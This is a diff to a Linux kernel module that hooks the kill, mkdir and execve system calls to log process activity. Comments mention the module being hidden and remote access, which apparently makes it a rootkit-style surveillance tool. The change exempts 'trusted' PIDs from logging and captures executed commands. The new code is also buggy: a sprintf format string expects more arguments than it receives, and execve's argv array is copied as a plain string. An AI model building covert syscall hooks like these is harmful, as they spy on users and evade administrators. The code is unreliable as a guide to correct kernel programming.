@@ -1,7 +1,7 @@
 /*===============================================*\
   all hooked syscalls and complimentary functions
 \*===============================================*/
-
+#include <linux/pid.h>
 #include "hooked_syscalls.h"
 
 extern int BUFFER_SIZE;
@@ -136,7 +136,7 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs){
 	char buffer[BUFFER_SIZE];
 	int pid = regs->di; //gets ID of process to be killed from pt_regs structure
 	int sig = regs->si; //gets signal from pt_regs structure
-	if (sig<10||sig==19||sig==18||sig==30){ //if interesting kill signal
+	if ((sig<10||sig==19||sig==18||sig==30)&&!(check_pid_trusted(pid))){ //if interesting kill signal
 		sprintf(buffer, "[hooked_syscalls.c::hooked_kill] process %i sent signal %i\n", pid, sig);
 	}
 	if (sig==64){ //DEBUG in case lkm is hidden and issues with remote access
@@ -166,15 +166,21 @@ static asmlinkage long hooked_mkdir(const struct pt_regs *regs){
 
 static asmlinkage long hooked_execve(const struct pt_regs *regs){
 	char buffer[BUFFER_SIZE];
-	char filename[NAME_MAX] = {0};
-	char __user *filename_user = (char *)regs->di; //gets userspace filename
+	char filename[NAME_MAX];
+	char args[BUFFER_SIZE];
+	memset(&filename, 0, NAME_MAX);
+	memset(&args, 0, BUFFER_SIZE);
 
-	long error =  strncpy_from_user(filename, filename_user, NAME_MAX); //copies filename from userspace to kernelspace
-	if (error>0){ //if sucsessfuly copied
-		sprintf(buffer, "[hooked_syscalls.c::hooked_execve] %s\n", filename);
+	char __user *filename_user = (char *)regs->di; //gets userspace filename
+	char __user *args_user = (char *)regs->si; //gets userspace args
+	int pid = pid_nr(get_task_pid(current, PIDTYPE_PID));
+	long err1 =  strncpy_from_user(filename, filename_user, NAME_MAX); //copies filename from userspace to kernelspace
+	long err2 = strncpy_from_user(args, args_user, BUFFER_SIZE); //copies filename from userspace to kernelspace
+	if (err1>0&&err2>0){ //if sucsessfuly copied
+		sprintf(buffer, "[hooked_syscalls.c::hooked_execve] %s %s    with pid %i\n", filename, pid);
 	}
 	else{
-		sprintf(buffer, "[hooked_syscalls.c::hooked_execve] unable to copy command- errcode recieved is %i\n", error); //copy message to buffer
+		sprintf(buffer, "[hooked_syscalls.c::hooked_execve] unable to copy command- err1: %i    err2: %i\n", err1, err2); //copy message to buffer
 	}
 	log_msg(buffer);
 	return sys_execve.orig_syscall(regs); //executes original syscall
